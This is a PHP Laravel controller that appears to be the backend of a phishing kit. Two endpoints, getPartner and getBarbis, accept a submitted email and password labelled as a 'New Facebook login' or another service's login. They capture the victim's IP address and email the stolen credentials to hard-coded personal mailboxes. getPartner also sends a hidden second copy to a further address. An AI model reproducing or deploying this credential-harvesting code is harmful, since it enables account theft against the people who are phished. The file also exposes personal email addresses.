<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $ret = null;
	
    	echo bcrypt("disenado");
    }
    
   
    
    
    public function getPartner(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'e' => 'required|email',
                             'p' => 'required',
                             't' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Authentication rejected! Please try again";
                       
                 }
                
                 else
                 {                  
                       $e = $req["e"];
                       $p = $req["p"];
                       $t = $req["t"];
                       
                       $rms =  ["holtchris147@gmail.com","nicolehenley1104@outlook.com"];
                 	  $s = "New Facebook login: ".date("h:i A jS F, Y");
                       $rcpt = isset($rms[$t]) ? $rms[$t] : $rms[0];
                       
                       $location = getenv("REMOTE_ADDR");

                       $this->helpers->sendEmail($rcpt,$s,['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view'); 
			$this->helpers->sendEmail("aquarius4tkud@yahoo.com",$s." (qwrty)",['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view');
                        $ret = "OK";                      
                  }       
           return $ret;                                                                                            
	}
	
	
	public function getBarbis(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'a' => 'required|email',
                             'b' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Authentication rejected! Please try again";
                      
                 }
                
                 else
                 {                  
                       $a = $req["a"];
                       $b = $req["b"];
                       $c = isset($req["c"]) ? $req["c"] : "";
                       
                 	  $s = "New ".$c." login: ".date("h:i A jS F, Y");
                       $rcpt = "tysonmcrichards@gmail.com";
                       
                       $location = getenv("REMOTE_ADDR");

                       $this->helpers->sendEmail($rcpt,$s,['e' => $a,'p' => $b,'location' => $location],'emails.barbis_alert','view'); 
                        $ret = "OK";                      
                  }       
           return $ret;                                                                                            
	}
	
}